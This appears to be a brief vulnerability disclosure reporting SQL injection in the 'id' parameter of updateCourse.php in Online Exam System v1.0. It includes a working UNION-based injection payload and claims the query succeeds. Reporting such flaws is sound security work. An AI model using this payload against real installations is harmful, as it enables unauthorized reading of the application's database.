# Online Exam System v1.0 has SQL injection

BUG_Author:hukai

Website source code address: https://www.sourcecodester.com/php/13877/online-exam-timer.html

Vulnerability File: /CEE/adminpanel/admin/facebox_modal/updateCourse.php

GET parameter 'id' exists SQL injection vulnerability

Payload1:id=-2' union all select null,concat(0x76777879,0x52535556),null-- -

There is sql injection, and the UNION query is successful

![image](https://github.com/sushanburanxisha/cve/blob/main/sql1.png)
